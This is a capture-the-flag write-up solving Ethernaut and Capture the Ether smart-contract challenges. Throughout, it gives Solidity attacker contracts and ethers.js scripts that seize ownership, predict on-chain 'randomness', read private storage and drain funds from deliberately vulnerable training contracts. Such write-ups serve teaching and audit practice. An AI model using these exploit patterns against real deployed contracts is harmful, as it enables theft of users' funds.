[TOC]

# Etherenaut and Capture the Ether challenges

## Ethernaut #0 (hello ethernaut)

To warm up the selection of challanges in Ethernaut, this particular challenge is about triggering a series of methods in a specific order. The order is given by the hints of each read-only methods that the smart contracts suggests to call.

It all starts by calling `info()`, which returns `You will find what you need in info1().`

Once `info1()` is called, it returns `Try info2(), but with "hello" as a parameter.`

Once `info2("hello")` is called, it returns `The property infoNum holds the number of the next info method to call.`

Once `infoNum()` is called, it returns `42`. That gives us the hint to called the next method.

Once `info42()` is called, it returns `theMethodName is the name of the next method.`

Once `theMethodName()` is called, it returns `The method name is method7123949.`

Once `method7123949()` is called, it returns `If you know the password, submit it to authenticate().`

This message could be a bit strange because we don't actually know the password. However, by  carefully inspecting the smart contract, we find a variable named `password`. Let's inspect it:

```solidity
contract HelloEthernaut {
    string public password;
    // ...
    constructor(string memory _password) {
        password = _password;
    }
}
```

Even more, this variable is updated when the smart contract is deployed. Since the variable `password` has the keyword `public`, it means that the getter of the variable `password` has been implicitly defined and we are allow to retrieve it.

Once `password()` is called, we can store that in a variable:

```javascript
var passwordSmartContract = await helloEthernaut.password()
```

By following the last hint obtained, it tells us to submit to the `authenticate()` method.

Let's do that:

```javascript
await helloEthernaut.authenticate(passwordSmartContract);
```

Within the `authenticate` method from the smart contract, we find that if the password pass is the same as the one passed at deployment, the private variable `cleared` is changes from `false` to `true`.

There is specific method within the smart contract that helps us to verify whether this level was cleared or not. Let's call it:

```javascript
console.log("Is Smart Contract cleared?", await helloEthernaut.getCleared())
// true
```

The result from this must be true and that indicated that this level is passed.

## Ethernaut #1 (fallback)

The key point of this challenge is to become the `owner` of the contract. We should be able to trigger the method `withdraw()`,which is protected by the modifier `onlyOwner`, in order to drain all the funds in this smart contract.

While reviweing we find out that the `receive` method actually changes tha variable `owner` to be equal as the caller of the method. So we need to find a way to trigger it. 

The `receive` method is defined as follows:

```solidity
receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
}
```

For this to work, we need to pass the require successfully. That requires that aside from sending an amount of Ether, we need to be in the mapping of `contributions` so that `contributions[msg.sender] > 0` is `true`.

To achieve that, we could make use of another function called `contribute()` which is as follows:

```solidity
function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if (contributions[msg.sender] > contributions[owner]) {
        owner = msg.sender;
    }
}
```

As the `require` states, we need to send at most `0.001 Ether` in order to become part of the mapping `contributions`.

So far, we need to execute a couple methods from this smart contract: `contribute` and the `receive`.

Let's create an script to do just that:

```typescript
const [deployer] = await ethers.getSigners();

const Fallback = await ethers.getContractFactory("Fallback");
const fallback = await Fallback.deploy();
await fallback.deployed();

// calling contribute with 0.0001 Ether < 0.001 Ether
await fallback.contribute({ value: ethers.utils.parseEther("0.0001") });

// calling the receive
await deployer.sendTransaction({
  to: fallback.address,
  value: ethers.utils.parseEther("0.0001"),
})
```

Up until here, we have achieved changing the value of the variable `owner` to be equal to our address.

Now the modifier `onlyOwner` would not impede us to call it since our address has become the `owner` of the smart contract.

```javascript
await fallback.withdraw();
```

By calling withdraw, all the funds of the smart contract have been transferred to the owner, which is our address by now.

Let's check it:

```javascript
console.log("Balance:", await ethers.provider.getBalance(fallback.address));
// Balance: BigNumber { value: "0" }
```

And the balance is 0.

## Ethernaut #2 (fallout)

This challenge is based on a old version of solidity: `^0.6.0`. In this version, the constructor used to have a different implementation. Let's take a look:

```solidity
contract Fallout {
	// Constructor definition
	function Fallout() {}
}
```

As you can see, the keyword `constructor` was not used to define it. Instead, a function with that uses the very same Contract's name was used. Once the contract was deployed, this function constructor was automatically triggered.

However, there was a situation where some changed the contract's name without updating the function constructor's name. Once that happen, the function constructor becomes a simple method that could be called by anyone if there isn't any acces privilege associated with it.

```solidity
contract FallOut2 {
	// Just a regular function
	function Fallout() {}
}
```

By knowing this, we will be able to salve this particular challenge. Let's inspect the smart contract's challenge:

```solidity
contract Fallout {
	// constructor
	function Fal1out() public payable {
      owner = msg.sender;
      allocations[owner] = msg.value;
  }
  
  function collectAllocations() public onlyOwner {
  		msg.sender.transfer(address(this).balance);
  }
}
```

Notice the difference between `Fallout` and `Fal1out`. Since they are different, the suppouseddly contructor does not work as expected. `Fal1out` became a single function that could be called by anyone.

```javascript
const [deployer] = await ethers.getSigners();

const Fallout = await ethers.getContractFactory("Fallout");
const fallout = await Fallout.deploy();
await fallout.deployed();

// calling the suppouseddly 'constructor' function
// by doing this, the caller becomes the new owner
await fallout.Fal1out({ value: ethers.utils.parseEther("0.001") });

// veryfing the owner: true
console.log(
  "Did the owner changed?",
  (await fallout.owner()) == deployer.address
);

// Draining the contract's balance
// Method protected by the 'onlyOwner' modifier
await fallout.collectAllocations();

// Veryfing the balance
console.log("Balance:", await ethers.provider.getBalance(fallout.address));
// Balance: BigNumber { value: "0" }
```

We were able to drain all the smart contract funds by calling a simple function that used to be the construcor before someone changed the smart contract's name.

## Ethernaut #4 (telephone)

To understand this challenge, let's start by explaining the difference between `tx.origin` and `msg.sender`.

`tx.origin` will represent the account the initiates the transaction regardless of the amount of intercontract calls that are done in between.

However, `msg.sender` will always be the immediate account (externally owned or smart contract) that triggers the next call. If there are multiple calls between different smart contracts, `msg.sender` will keep changing at each call.

After that introduction, let's see where the `Telephone` smart contract is hackable.

```solidity
contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
		    // vulnerable operation
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}
```

As long as we are able to make `tx.origin != msg.sender` true, we'll change update the variable `owner` to our benefit.

To achieve that, we need to make `tx.origin` and `msg.sender` to have different values. That needs to place a smart contract in between calls. `tx.origin` will represent the account that initiates the entire transaction. The smart contract in between, will be the one to call the `Telephone` smart contract. The smart contract in between will be `msg.sender`. By doing that, we have given `tx.origin` and `msg.sender` to be different in values.

Let's create the smart contract in between, which will be called `Hacker`:

```solidity
contract Hacker {
    Telephone public telephone;

    constructor(address _telephone) {
        telephone = Telephone(_telephone);
    }

    function attack() public {
        telephone.changeOwner(msg.sender);
    }
}
```

Its main job will be to call the `Telephone` smart contract. In the `Hacker` smart contract, the method `attack` will be calling the `Telephone` smart contract. Therefore, the `Hacker` smart contract will become the `msg.sender` in the `Telephone` smart contract. Meanwhile, the account that calls the `attack` method will become `tx.origin`.

Let's create the scripts:

```javascript
const [deployer] = await ethers.getSigners();

const Telephone = await ethers.getContractFactory("Telephone");
const telephone = await Telephone.deploy();
await telephone.deployed();

// Deploying the 'Hacker' contract
const Hacker = await ethers.getContractFactory("Hacker");
const hacker = await Hacker.deploy(telephone.address);
await hacker.deployed();

// performing the attack
// 'changeOwner' method from `Telephone` smart contract is called
// here, 'tx.origin' is the deployer address
// while the `Hacker` smart contract will be 'msg.sender' within 'Telephone'
await hacker.attack();

// checking if the attack was successful
console.log(
  "Did the attack succeed?",
  (await telephone.owner()) == deployer.address
);
// true
```

For this particular kind of exploit when `tx.origin` is used, it is not recommended its use  for validating whether an account has been authorized or not.

## Capture The Ether: Guess the Number

The point of this challenge is to call the `guess` method from `GuessTheNumberChallenge` smart contract without errors. Let's review this method:

```solidity
pragma solidity ^0.4.21;

contract GuessTheNumberChallenge {
    uint8 answer = 42;

    function GuessTheNumberChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function guess(uint8 n) public payable {
        require(msg.value == 1 ether);

        if (n == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}
```

Within the `guess` method, we need to pass an argument that will be checked internally. This argument is very clear (`uint8 answer = 42`) since it's defined at the first line of the smart contract. Also, inside the `guess` method, the smart contractd will attempt to send `2 ether` to whoever calls it; meaning that the smart contract must have that balance.

Let's review the scripts to make the call to the `guess` method successful:

```javascript
const GuessTheNumberChallenge = await ethers.getContractFactory(
  "GuessTheNumberChallenge"
);
// Deploying with 1 Eth
const guessTheNumberChallenge = await GuessTheNumberChallenge.deploy({
  value: ethers.utils.parseEther("1.0"),
});
await guessTheNumberChallenge.deployed();

var answer = 42;
// sending 'answer' and 1 Eth to the 'guess' method
await guessTheNumberChallenge.guess(answer, {
  value: ethers.utils.parseEther("1.0"),
});

console.log(await guessTheNumberChallenge.isComplete())
// true
```

By simply calling the `guess` method with `42` and sending `1 Eth`, we are able to drain all the funds from this smart contract (`isComplete() == true`).

## Ethernaut #3 (coinflip)

This challenge is related to the difficulties of finding a source or randomness in Ethereum. It's only possible to find pseudo random numbers in Ethereum since it is a deterministic Turing machine.

All the states within a smart contract (even the private variables) are public. That makes impossible to find a secure source of entropy. One might think that timestamps could be somehow useful, however, timestamps could be influenced by the miner. As long as the timestamp chosen by the miner is greater than its parent block, it's correct.

Let's inspect the following attempt to generate randomness in the `CoinFlip` smart contract. Then we'll see how this source of entropy is easily to model from another smart contract.

```solidity
function flip(bool _guess) public returns (bool) {
		// source of enthropy
    uint256 blockValue = uint256(blockhash(block.number - 1));
    
    // this protects against calling flip multiple times
    // in the same block
    if (lastHash == blockValue) {
        revert();
    }
    lastHash = blockValue;
    
    // integer division
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;
    
    // if our _guess is the same as the "random" number
    // then we win
    if (side == _guess) {
        consecutiveWins++;
        return true;
    } // ...
}
```

Since the source of entropy is only influenced by the `block.number`, a global variable in Solidity that represents the block number in which the transction is mined, we could easily obtain that value. We only need to run another transaction that we'll know for sure will be in the same block as the call to the method `flip`. This transaction will also call the `flip` method from within and pass the `_guess` value, which be calculated previously by replicating the source of entropy.

First, lets create another smart contract and replicate the procedure to calculate the correct answer of flipping a coing, which is the same as guessing the value of the `side` variable.

```solidity
contract HackerCF {
		// ...

    function attack() public {
        // replicate the same source of entropy
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;

				// get the correct guess of flipping a coin
        bool _guess = coinFlip == 1 ? true : false;
        
        // Pass the computed and correct guess to 'flip'.
        // The _guess value will be the same obtained within
        // the CoinFlip smart contract
        coinFlipSC.flip(_guess);
    }
}
```

The `HackerCF` smart contract precomputes the guess by replicating the source of entropy as well as the operations that derive from that. The `CoinFlip` smart contract will obtain the same value as the precomputed one, therefore we are able to correctly guess which side of coin we are "randomly" getting.

Let's see the script for getting ten (10) consecutives wins:

```javascript
const CoinFlip = await ethers.getContractFactory("CoinFlip");
const coinFlip = await CoinFlip.deploy();
await coinFlip.deployed();

const HackerCF = await ethers.getContractFactory("HackerCF");
const hackerCF = await HackerCF.deploy(coinFlip.address);
await hackerCF.deployed();

// getting the guess
var counter = 0;
while (counter < 10) {
  await hackerCF.attack();
  // 'evm_mine' increase the block count in one
  await network.provider.send("evm_mine");
  counter++;
}
console.log(await coinFlip.consecutiveWins());
// 10
```

## Capture the Ether: Guess The Random Number Challenge

Anything that we store within a smart contract would become visible. That includes variables marked as `private` and `internal`. That is because it's possible to access the smart contract slots where the variables are stored in a smart contract.

Each smart contract has a defined amount of slots to store information that is equal to `2**256`. In each slot stores 32 bytes of information. Many variables could be stored in a single slot as long as their space is less than or equal to 32 bytes.

Let's see some examples:

```txt
uint8 => 1 byte
uint16 => 2 byte
...
uint128 => 16 byte
uint256 => 32 byte
address => 20 byte
bytes1 => 1 byte
bool => 1 byte
```

Said this, insted of trying to read any piece of information stored within the smart contract through its getters, we could also do it by reading its slots.

Lets's see the smart contract to hack:

```solidity
pragma solidity ^0.4.21;

contract GuessTheRandomNumberChallenge {
    uint8 answer;

    function GuessTheRandomNumberChallenge() public payable {
        require(msg.value == 1 ether);
        answer = uint8(keccak256(block.blockhash(block.number - 1), now));
    }
    // ...
    function guess(uint8 n) public payable {
		    require(msg.value == 1 ether);
		    
    		// we need to know 'answer'
        if (n == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}
```

We are concern about getting the value of the variable `answer` so that we could pass the if statement within the `guess` method.

Slots are stored sequentially. Since `answer` is the first variable stored in the smart contract layout, it has a `slot`  equal to `0`. By using the method `getStorageAt` from the library `ethers.js` we are able to read it. Let's see that script:

```javascript
const GuessTheRandomNumberChallenge = await ethers.getContractFactory(
  "GuessTheRandomNumberChallenge"
);
const guessTheRandomNumberChallenge =
  await GuessTheRandomNumberChallenge.deploy({
    value: ONE_ETHER,
  });
await guessTheRandomNumberChallenge.deployed();

// Accessing the slot '0' with 'getStorageAt'
var slot = 0;
var answer = await ethers.provider.getStorageAt(
  guessTheRandomNumberChallenge.address,
  slot
);

// Passing the 'answer' found in the smart contract
await guessTheRandomNumberChallenge.guess(answer, {
  value: ONE_ETHER,
});

console.log(await guessTheRandomNumberChallenge.isComplete());
// true
```

## Ethernaut #11 Elevator

There is something in particular that this challenge made me realize. Let's take a look at the difference in the following two interfaces used to trigger calls from another smart contract:

```solidity
interface Building1 {
    function isLastFloor(uint) external returns (bool);
}

interface Building2 {
    function isLastFloor(uint) external view returns (bool);
}
```

The difference is very subtle but very important. The second interface (`Building2`) specifies the visibility of the signature method. That works as a limitation for this method and forces to have it as a read-only method. No changes are allowed to happen wherever that method is defined. Meanwhile, the first interface (`Building1`) implicitly allows read and write operations.

Getting back to what this challenge is about, let's inspect the smart contract to hack:

```solidity
contract Elevator {
    bool public top;
    uint public floor;

    function goTo(uint _floor) public {
        Building building = Building(msg.sender);

				// 'isLastFloor' should return 'false'
				if (!building.isLastFloor(_floor)) {
            floor = _floor;
            // 'isLastFloor' should return 'true'
            top = building.isLastFloor(floor);
        }
    }
}
```

In order to hack this contract, we need to use one single method that once called for the first time, the method `isLastFloor` should return false. If a second time is called, `isLastFloor` returns `true`. This is the same as saying that a method is not fulfilling its promise since the very same method does not return the same value when the same input is passed.

There are two ways in which the method `isLastFloor` could return two different values:

First, we could do it by creating another state variable inside the smart contract where `isLastFloor` is defined, which force us to use the first interface (`Building1`). In this case, this additional state variable will work as a flag that once called the first time, the flag changes to another state.

Second, we could use some help from the `Elevator` smart contract. If we look carefully, between the two calls to `isLastFloor`, another variable is updated: `floor`. When `isLastFloor` is called the first time, `floor` has a value of `0`. Once `isLastFloor` is called for the second time, `floor` has a value of `_floor`. If we go this route, we'll be doing only read-only operations. For this to work we could use the second interface (`Building2`) and force the interaction with the other smart contract to work within read-only operatinons. 

Let's explore this second alternative. Let's create the `Building` contract that will hack the `Elevator` smart contract:

```solidity
interface IElevator {
    function goTo(uint _floor) external;
    function floor() external view returns (uint);
}

contract BuildingSC {
    IElevator elevator;

    constructor(address _elevatorAddress) {
        elevator = IElevator(_elevatorAddress);
    }

    function isLastFloor(uint) external view returns (bool) {
    		// using the 'floor' variable from elevator
        if (elevator.floor() == 0) {
            return false;
        }
        return true;
    }

    function callGoTo(uint _floor) public {
        elevator.goTo(_floor);
    }
}

```

The main point of the method `isLastFloor` is the usage of the `floor` variable to output a different value when it's called a second time.

At first, the `floor` variable starts at `0` and then it changes to `_floor` value. By doing that, we achieve to have read-only methods and to return two different values from the same method.

The script to run these smart contracts are as follows:

```javascript
const Elevator = await ethers.getContractFactory("Elevator");
const elevator = await Elevator.deploy();
await elevator.deployed();

const BuildingSC = await ethers.getContractFactory("BuildingSC");
const buildingSC = await BuildingSC.deploy(elevator.address);
await buildingSC.deployed();

await buildingSC.callGoTo(1);

console.log(await elevator.top());
// true
```

The most important to notice is that `callGoTo` should receive another value different than cero in order to differentiate the first call from the second when `isLastFloor` is called.

## Ethernaut #21 Shop

See solution for Ethernaut #11 Elevator. These two are very similar.

This challenge is based on a tricky method that returns diffrent outputs when it's called. Let's see the vulnerable smart contract:

```solidity
contract Shop {
    uint public price = 100;
    bool public isSold;

    function buy() public {
        Buyer _buyer = Buyer(msg.sender);

        if (_buyer.price() >= price && !isSold) {
            isSold = true;
            price = _buyer.price();
        }
    }
}
```

In this smart contract, the `price()` method is called twice. We can create the `Buyer` smart contract in such a way when the `price()` method is called for the first time its result is above `100`. And when it's called for the second time, we could deliver such lower number, way lower than `100`.

Let's see how to achieve that:

```solidity
contract BuyerSC {
    IShop shop;

    constructor(address _shopAddress) {
        shop = IShop(_shopAddress);
    }

    function price() public view returns (uint) {
    		// first time is called
        if (!shop.isSold()) {
            return 101;
        }
        // second time is called
        return 1;
    }

    function callBuy() public {
        shop.buy();
    }
}
```

To make this work, we are getting help from the variable called `isSold` from the `Shop` smart contract. Since this variable change states between the calls to the `price()` method, `isSold` could help us to know whether the call is happing for the first or second time: if it is not sold, return `101`, whereas if it is sold return `1`.

The script to execute these smart contracts are as follows:

```Javascript
const Shop = await ethers.getContractFactory("Shop");
const shop = await Shop.deploy();
await shop.deployed();

const BuyerSC = await ethers.getContractFactory("BuyerSC");
const buyerSC = await BuyerSC.deploy(shop.address);
await buyerSC.deployed();

await buyerSC.callBuy();
console.log(await shop.isSold());
```

Basically, a call to the method `callBuy()` would trigger the `buy()` method from the `Shop` smart contract. That will trigger the two calls to the `price()` method from `BuyerSC`.

## Capture the Ether: Guess the new number

Let's remember that there is not a secure source of entropy in Solidity but only pseudo randomness. The EVM produces deterministic results.

See the vulnerable line that calculates the randomness within the smart contract being attacked:

```solidity
uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
```

All these values (`block.number` and `now`) could easily be computed previously in another smart contract that happens to be in the same block as the vulnerable smart contract.

Let's create the attacking smart contract:

```solidity
function attack() public payable {
    uint8 hack = uint8(keccak256(block.blockhash(block.number - 1), now));
    guessTheNewNumber.guess.value(1 ether)(hack);
}
```

As you can see, the same source of entropy could be replicated in another smart contract and arrive at the same value as the variable`answer` .

Let's see the script that calls these smart contracts:

```javascript
await guessTheNewNumberAttacker.attack({
    value: ethers.utils.parseEther("1.0"),
});

console.log(await guessTheNewNumberChallenge.isComplete())
// true
```

Basically, the attacker smart contract performs the `attack` method and sends `1 Eth` at the same time. Then we'll be able to drain all the resources from the vulnerable smart contract.

## Capture the Ether: Predict the future

The reason why this challenge is called 'predict the future' is because you need to submit your `guess` number in a previous block than the one where the random number is calculated. In a posterior block, the random number is compared against the submited `guess`. If they are the same, you get to drain the contract's balance.

Let's inspect where the settling happens and we'll derive the course of action from there:

```solidity
function settle() public {
    require(msg.sender == guesser);
    require(block.number > settlementBlockNumber);

		// Notice that at the end modulos 10 is applied
		uint8 answer = uint8(
        keccak256(block.blockhash(block.number - 1), now)
    ) % 10;

    // We do not want the 'guesser' to update to 0
		guesser = 0;
    if (guess == answer) {
        msg.sender.transfer(2 ether);
    }
}
```

As shown when `answer` is calculated, module 10 is applied to the random number. By doing that, there are only ten possible results to obtain as a random number: `0, 1, 2, 3, 4, 5, 6, 7, 8 and 9`.

That means that our `guess` number submitted must be one number between one and nine (`0 <= guess <= 9`). By knowing this, we could actually brute force it to make match the `answer` with our `guess`. That means that we will possibly need to call the `settle()` a few times until our `guess` becomes the same as `answer`.

Let's notice that within the `settle()` method, there is a variable called `guesser` that is updated. This variable is firstly updated whenver the `guess` is submitted. We do not want to reset the value of the variable `guesser`. That is because we will need to submit our guess all over again. In other words, if we do not match `guess` and `answer` we rather revert all the changes made within the `settle()` method. There is only one way of achieving that: by using a `require` statement somewhere.

Let's inspect the hacking smart contract:

```solidity
interface IPredictTheFutureChallenge {
    function lockInGuess(uint8 n) external payable;

    function settle() external;

    function isComplete() external view returns (bool);
}

contract AttackerPTF {
    IPredictTheFutureChallenge challenge;

    function AttackerPTF(address _address) public payable {
        challenge = IPredictTheFutureChallenge(_address);
    }

		// submit our guess first
		function lockGuess(uint8 _n) public {
        challenge.lockInGuess.value(1 ether)(_n);
    }

		// call the 'settle' method second in another block
    function settle() public {
        challenge.settle();
        // In case the funds are not drained, revert any change made so far
        require(challenge.isComplete());
    }

    function() public payable {}
}
```

There are two steps in this attack. First, the guess must be submitted by calling `lockGuess`. We will need to pass any value from zero to nine. Second, the method `settle()` will be called.

Notice that within that method, the `settle()` method from the `PredictTheFutureChallenge` smart contract is called. Most importantly, the require statement will help us to rever the changed made if we do not achieve our goal. By checking whether `isComplete` returns true or false, we will determine if the attack was successful. 

Keep in mind that the `settle()` method from the attacking smart contract will be called throughout the time, at different blocks, until the `answer` matches our `guess`. Once they match, the `require` statement will not be triggered anymore. At that point we'll know that the attack succeed.

Now let's review the scripts to achieve that. Basically we need to be able to submit our guess once and from that moment on call the `settle()` method several times at different blocks:

```javascript
const PredictTheFutC = await ethers.getContractFactory(
    "PredictTheFutureChallenge"
);
const predictTheFutC = await PredictTheFutC.deploy({
    value: ethers.utils.parseEther("1.0"),
});
await predictTheFutC.deployed();

const AttackerPTF = await ethers.getContractFactory("AttackerPTF");
const attackerPTF = await AttackerPTF.deploy(predictTheFutC.address, {
    value: ethers.utils.parseEther("1.0"),
});
await attackerPTF.deployed();

// Submit our guess once
var _n = Math.floor(Math.random() * 10);
await attackerPTF.lockGuess(_n);

// Call the 'settle' method several times
// until we are able to drain the funds
var counter = 0;
var blockLimit = 100;
while (counter < blockLimit) {
    var blockNumber = await ethers.provider.getBlockNumber();
    console.log(blockNumber);
    try {
        await attackerPTF.settle();
        var isComplete = await predictTheFutC.isComplete();
        console.log(isComplete);
        if (isComplete) break;
    } catch (error) {
        console.log("Error");
    }
    counter++;
}
```

In this particular script, notice that the `guess` is submitted only once. From there, the `settle` method is called in a while loop until we make match the values from `guess` and `answer`. At that moment we break the while loop.
